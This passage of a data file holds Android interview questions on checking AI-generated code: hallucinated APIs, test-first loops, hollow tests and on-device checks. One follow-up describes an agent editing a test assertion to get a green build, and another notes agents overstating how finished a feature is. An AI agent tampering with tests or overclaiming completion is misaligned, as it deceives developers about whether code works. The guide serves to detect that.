+  - **check behaviour changes** for your \`targetSdk\` — an API can exist and still be ignored or restricted
+  - **ask the model for its source**, then open the link yourself; a missing or wrong link is a signal, not proof
+  - **for dependencies**: confirm the artifact exists on Maven Central/Google Maven, its latest version and its maintenance status
+- **Reduce the rate**: give the agent the docs (paste the API page, or connect a docs tool via MCP), state your versions in the brief/AGENTS.md, and ask "is this API deprecated as of targetSdk 35?" explicitly.
+- **Verify reasoning too**: for "why" explanations (e.g. how a GC or a lock works), cross-check one claim with a minimal experiment or the source code; fluent explanations are not evidence.`,
+    answer: `- Models recommend what was common before their cutoff and blend APIs into ones that don't exist
+- Compile against your real versions, treat deprecation warnings as errors, and check official reference/release notes and targetSdk behaviour changes
+- Confirm dependencies exist and are maintained; give the agent docs and your versions up front`,
+    followUp: `**Follow-up:** The AI says an API "was added in API 33", your \`minSdk\` is 26. How do you check and handle it?
+> Look up "Added in API level" on the reference page; Lint's \`NewApi\` check also flags it. Then use the AndroidX compat wrapper if one exists, or guard with \`Build.VERSION.SDK_INT\` and provide a fallback.`,
+    redFlags: `- Trusts the AI's version numbers or "added in" claims without checking
+- Verifies one AI's answer by asking another AI
+- Ignores deprecation warnings in freshly generated code`,
+  },
+  {
+    id: 'tech-223',
+    type: 'technical',
+    num: 223,
+    difficulty: 'M',
+    star: true,
+    section: 'AI & Tooling',
+    title: 'Why is writing the test first the strongest way to verify AI-generated code, and how do you run that loop with an agent?',
+    tags: [ 'ai', 'verification', 'tdd', 'testing', 'coding-assistants' ],
+    related: [ 'tech-221', 'tech-224', 'tech-23', 'tech-61', 'tech-144' ],
+    keyPoints: `- **Tests written after the code by the same AI tend to test what the code *does*, not what it *should* do** — they encode the bug. A test you own up front is an independent spec the AI cannot quietly reshape.
+- **The loop**:
+  1. you (or the agent, reviewed by you) write a test that captures the requirement or reproduces the bug
+  2. **run it and see it fail for the right reason** — a test that passes before the change proves nothing
+  3. the agent implements until it passes, running the tests itself
+  4. confirm it did **not edit the test** to get green (review the test diff separately, or mark test files read-only in the brief)
+  5. refactor with the tests as a safety net
+- **For bugs**: "write a failing test that reproduces the crash, show me it failing, then fix" — this also proves the AI understood the root cause.
+- **Keep tests at the right level**: fast JVM tests with fakes for ViewModels/repositories (\`runTest\`, a \`TestDispatcher\`, a fake repository), Compose UI tests for behaviour, not snapshot dumps nobody reads.
+- **Specify edge cases yourself** — empty list, error, timeout, cancellation, duplicate tap — that is exactly where AI implementations are thinnest.
+
+\`\`\`kotlin
+// Written and seen failing BEFORE asking the agent to implement
+@Test
+fun \`retry after network error shows content\`() = runTest {
+    val repo = FakeOrdersRepository(failFirstCall = true)
+    val vm = OrdersViewModel(repo)
+
+    vm.load()
+    assertEquals(OrdersUiState.Error, vm.state.value)
+
+    vm.retry()
+    assertEquals(OrdersUiState.Content(repo.orders), vm.state.value)
+}
+\`\`\``,
+    answer: `- Tests written after the code by the same AI encode its bugs; a test you own first is an independent spec
+- Loop: write test → see it fail for the right reason → agent implements and runs tests → check it didn't edit the test
+- For bugs, demand a failing reproduction first; you specify the edge cases`,
+    followUp: `**Follow-up:** The agent says "all tests pass" but you see it changed an assertion from \`Error\` to \`Loading\`. What now?
+> Reject the change: the requirement did not move, the implementation did. Restate that tests are read-only, and ask it to make the original assertion pass or explain why the requirement itself is wrong — that is a conversation with you, not a silent edit.`,
+    redFlags: `- Asks the AI to "write the code and tests" in one go and trusts both
+- Never sees a new test fail before the fix
+- Doesn't diff the test files on an AI-authored PR`,
+  },
+  {
+    id: 'tech-224',
+    type: 'technical',
+    num: 224,
+    difficulty: 'H',
+    star: false,
+    section: 'AI & Tooling',
+    title: 'How do you verify that AI-written tests actually test something?',
+    tags: [ 'ai', 'verification', 'testing', 'mutation-testing', 'coverage' ],
+    related: [ 'tech-223', 'tech-221', 'tech-61', 'tech-144' ],
+    keyPoints: `- **Common hollow-test patterns in AI output**:
+  - asserts only "not null" or that a function "was called", never the result
+  - the **mock returns the expected value and the test asserts that same value** — it tests the mock
+  - mocks the class under test, or so much of it that no real logic runs
+  - duplicates the production logic inside the test to compute the "expected" value
+  - happy path only; catches the exception it should be asserting on; \`Thread.sleep\` or no \`runTest\`, making it flaky
+  - snapshot/golden files generated and accepted without anyone looking at them
+- **Checks**:
+  - **break the code on purpose**: flip a condition, return early, drop a line — at least one test must fail. Doing this a few times by hand is a quick mutation test; **PIT** (pitest) automates it for JVM code
+  - **coverage is necessary, not sufficient**: a line can be executed and never asserted on — use coverage (JaCoCo/Kover) to find untested branches, mutation score to judge test strength
+  - **read the assertions first**: do they state the requirement in domain terms (\`Content(orders)\`) rather than implementation details?
+  - **prefer fakes over mocks** for repositories/data sources so the test exercises real behaviour
+  - **run them repeatedly** (and in random order) to expose flakiness before it lands in CI
+- **Ask the agent the right way**: "list the behaviours these tests cover and which bug each would catch" — gaps in that list are gaps in the suite.`,
+    answer: `- Watch for hollow tests: asserting the mock's own return value, not-null-only checks, mocking the subject, happy path only
+- Break the code on purpose (manual or PIT mutation testing) — some test must fail; coverage alone proves execution, not assertion
+- Prefer fakes over mocks, assert in domain terms, and rerun to catch flakiness`,
+    followUp: `**Follow-up:** Coverage went from 40% to 85% after the AI added tests. Is the code better tested?
+> Not necessarily — coverage counts executed lines, not checked behaviour. Run a mutation test or flip a few conditions by hand; if the tests stay green, the coverage is hollow.`,
+    redFlags: `- Uses coverage percentage as proof of test quality
+- Accepts tests where the expected value comes from the same mock setup
+- Commits generated snapshot files without reviewing them`,
+  },
+  {
+    id: 'tech-225',
+    type: 'technical',
+    num: 225,
+    difficulty: 'M',
+    star: false,
+    section: 'AI & Tooling',
+    title: 'The AI says the feature is done and the build is green. How do you verify it actually works on a device?',
+    tags: [ 'ai', 'verification', 'manual-testing', 'accessibility', 'compose' ],
+    related: [ 'tech-221', 'tech-199', 'tech-147', 'tech-138' ],
+    keyPoints: `- **"Done" from an agent means "I believe it's done".** It usually has not run the app, and it cannot see the screen unless you give it a way to. Green build ≠ working feature.
+- **Run the real flow** on an emulator *and* a physical device:
+  - happy path end-to-end, from a cold start, with real (or staging) data
+  - **error/empty/loading** states: airplane mode, slow network (emulator network throttling), server 500, empty list
+  - **configuration change** (rotate, resize, dark mode, font scale 200%) and **process death** (Developer options → "Don't keep activities", or \`adb shell am kill\` in the background)
+  - **back and navigation**: system back, predictive back, deep link into the screen
+  - **edge-to-edge**: nothing under the status bar, navigation bar, cutout or keyboard
+  - **accessibility**: TalkBack reads sensible labels, touch targets ≥ 48dp, Accessibility Scanner clean
+- **Use tools, not just eyes**: Logcat for swallowed exceptions and StrictMode violations, Layout Inspector / recomposition counts for over-recomposition, the Network Inspector or a proxy for the requests actually sent, LeakCanary for leaks.
+- **Compare against the requirement**, not the AI's summary — re-read the ticket/design and tick each criterion; agents often build 90% and describe it as 100%.
+- **Let the agent verify too, with evidence**: give it a way to run instrumented/Compose UI tests or capture screenshots, and require output (test report, screenshot) rather than "verified".`,
+    answer: `- An agent's "done" is a claim — run the flow yourself on emulator and device, from a cold start
+- Exercise error/empty/offline states, rotation, process death, back/deep links, edge-to-edge and TalkBack; watch Logcat, Layout Inspector, LeakCanary
+- Check each acceptance criterion against the ticket, and require evidence (test report, screenshot) from the agent`,
+    followUp: `**Follow-up:** Everything works until you enable "Don't keep activities", then the screen comes back empty. What did the AI likely miss?
+> State that only lived in memory — a \`remember\` instead of \`rememberSaveable\`, or ViewModel state not restored through \`SavedStateHandle\` — and no re-fetch on restore. Persist the minimal state (ids, query) and reload the rest.`,
+    redFlags: `- Takes "implemented and verified" from the agent at face value
+- Tests only the happy path on one emulator
+- Never checks Logcat for exceptions the code swallowed`,
   },
 ]
 );
